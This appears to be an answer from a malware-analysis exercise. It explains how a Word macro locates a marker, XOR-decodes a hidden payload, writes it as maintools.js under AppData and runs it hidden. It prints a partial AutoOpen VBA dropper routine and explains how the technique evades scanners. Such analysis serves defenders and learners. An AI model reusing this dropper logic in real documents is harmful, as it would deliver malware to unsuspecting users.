### Q5 — Deep dive: Markers and how VBA pulls a hidden payload into memory

When attackers hide a second‑stage payload inside a Word document, they need a reliable way for the macro to “find the right bytes” without parsing every XML part or OLE stream. A marker, which is a long and unlikely string in the document. 

The macro reads the document’s content into memory (as text or raw bytes), searches for the marker, and then treats everything immediately after it as the payload. That payload is commonly XOR‑obfuscated so static scanners won’t match known signatures.

Think of the document in memory as a long tape. The marker is the flag stuck at the exact point where the malicious blob begins. The macro only needs to: locate the flag, slice the bytes after it, XOR‑decode them, write them out, and run the result. This is efficient, portable across .doc/.docx, and resilient against small format changes.

Sample code:
```
Sub AutoOpen()
    Dim buf() As Byte, start&, i&, key As Byte, out() As Byte
    key = 45                     ' same as decimal 45 you observed
    buf = ReadFileAsBytes(ActiveDocument)   ' or Range/Text → StrConv to bytes
    start = FindMarker(buf, "MxOH8pcr...R1Hh") ' unique beacon in the doc
    out = Slice(buf, start + Len("MxOH8pcr...R1Hh"))
    For i = 0 To UBound(out)     ' simple XOR deobfuscation
        out(i) = out(i) Xor key
    Next
    WriteBytes Environ$("AppData") & "\Microsoft\Windows\maintools.js", out
    CreateObject("WScript.Shell").Run Environ$("AppData") & _
        "\Microsoft\Windows\maintools.js 16827", 0, False
```

Memory visualization (simplified)

```
0x00000000  [word/document.xml text] ............ [normal prose]
0x0001B7C2  "MxOH8pcrle...R1Hh"   <-- MARKER (anchor)
0x0001B812  [payload bytes after marker] [obfuscated (XOR 0x2D)]
0x0001F000  [benign trailing text / style runs]
```

After finding 0x0001B7C2, the macro slices from 0x0001B812 forward, XORs each byte with 0x2D (decimal 45, which appears in your dump), and writes the decoded buffer as maintools.js. The use of Environ$("AppData") and a subfolder under Microsoft\Windows is deliberate: it blends with legitimate paths and avoids UAC prompts.

After the macro locates the marker and slices the payload, the next step is decoding. Attackers almost always apply a lightweight obfuscation layer to avoid static detection. The most common technique? XOR

XOR (exclusive OR) is a bitwise operator that flips bits based on a key. If you XOR the same data twice with the same key, you get the original back. This property makes XOR ideal for simple encryption and obfuscation because:

1. Simplicity: It’s trivial to implement in VBA, JavaScript, or any language. A single loop and one operator suffice.
2. Speed: XOR runs fast even on large buffers, which matters when macros process thousands of bytes.
3. Stealth: XOR doesn’t require external libraries or complex algorithms—just native language operators. That means fewer suspicious API calls.
4. Signature Evasion: Static scanners often look for known strings or patterns. XOR scrambles those strings into high-entropy noise, defeating naive signature-based detection.

XOR transforms readable code into gibberish until the macro runs its decode routine. Combined with the marker technique, this creates a two-step concealment strategy:

1. Marker anchors the payload so the macro knows where to start.
2. XOR obfuscates the payload so scanners see only random bytes.

Overall, classic AV engines cannot easily match known malicious JS fragments as they are obfuscated in the document itself.


